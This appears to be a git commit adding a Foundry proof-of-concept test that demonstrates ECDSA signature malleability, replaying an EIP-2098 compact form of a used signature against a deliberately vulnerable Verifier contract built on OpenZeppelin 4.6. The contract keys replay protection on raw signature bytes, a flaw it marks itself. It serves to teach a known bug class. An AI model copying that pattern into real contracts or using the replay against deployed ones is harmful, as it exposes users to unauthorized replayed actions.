2801b11b79ace931ce657a0367d39949a05fc1e0
Pascal Marco Caversaccio <pascal.caversaccio@hotmail.ch>
2023-06-10 19:36:06 +0200

    ♻️  PoC works
    Signed-off-by: Pascal Marco Caversaccio <pascal.caversaccio@hotmail.ch>

--- test/SignatureMalleability.t.sol
+++ test/SignatureMalleability.t.sol
@@ -5,22 +5,43 @@ import {Test} from "forge-std/Test.sol";
 
 import {BytesLib} from "solidity-bytes-utils/BytesLib.sol";
 
-contract ValidateSignature {
+/**
+ * @dev We use the version `4.6`, which is vulnerable to the signature malleability exploit,
+ * using compact signatures showcased below:
+ * https://github.com/OpenZeppelin/openzeppelin-contracts/tree/release-v4.6.
+ */
+import {ECDSA} from "openzeppelin/utils/cryptography/ECDSA.sol";
+
+contract Verifier {
     /**
-     * @dev Error that occurs when the signature was already used.
+     * @dev Error that occurs when the signature has already been used.
      * @param emitter The contract that emits the error.
      */
     error SignatureUsed(address emitter);
 
-    mapping(address sender => uint256 counter) public signatureCounter;
-    mapping(bytes signature => bool flag) private _signatureUsed;
+    /**
+     * @dev Error that occurs when the signature is invalid.
+     * @param emitter The contract that emits the error.
+     */
+    error InvalidSignature(address emitter);
 
-    function verifySignature(bytes memory signature) public {
-        if (_signatureUsed[msg.sender]) revert SignatureUsed(address(this));
+    mapping(address sender => uint256 counter) public signatureCounter;
+    mapping(bytes signature => bool flag) private signatureUsed;
+
+    address private self = address(this);
+
+    function verifySignature(bytes32 hash, bytes memory signature) public {
+        if (signatureUsed[signature]) revert SignatureUsed(self);
+
+        address signer = ECDSA.recover(hash, signature);
+        if (signer != msg.sender) revert InvalidSignature(self);
         unchecked {
+            /// @dev For testing purposes, the counter is simply incremented.
             signatureCounter[msg.sender] += 1;
         }
-        _signatureUsed[msg.sender] = true;
+
+        /// @dev We use the signature as unique identifier. DO NOT DO THIS!
+        signatureUsed[signature] = true;
     }
 }
 
@@ -39,6 +60,13 @@ contract SignatureMalleabilityTest is Test {
      */
     error InvalidSignatureSValue(address emitter);
 
+    /**
+     * @dev Error that occurs when the signature has already been used.
+     * @param emitter The contract that emits the error.
+     */
+    error SignatureUsed(address emitter);
+
+    Verifier private verifier;
     address private self = address(this);
 
     /**
@@ -56,7 +84,34 @@ contract SignatureMalleabilityTest is Test {
         return short;
     }
 
-    function testMalleableSignature() public {
+    function setUp() public {
+        verifier = new Verifier();
+    }
 
+    function testMalleableSignature() public {
+        (address alice, uint256 key) = makeAddrAndKey("alice");
+        bytes32 hash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", "WAGMI"));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        /**
+         * @dev Standard signature check.
+         */
+        vm.startPrank(alice);
+        verifier.verifySignature(hash, signature);
+        assertEq(verifier.signatureCounter(alice), 1);
+
+        vm.expectRevert(abi.encodeWithSelector(SignatureUsed.selector, address(verifier)));
+        /// @dev Must revert since the signature has already been used.
+        verifier.verifySignature(hash, signature);
+
+        /**
+         * @dev EIP-2098 signature check.
+         */
+        bytes memory signature2098 = to2098Format(signature);
+        verifier.verifySignature(hash, signature2098);
+        /// @dev Malleability successfully exploited.
+        assertEq(verifier.signatureCounter(alice), 2);
+        vm.stopPrank();
     }
 }
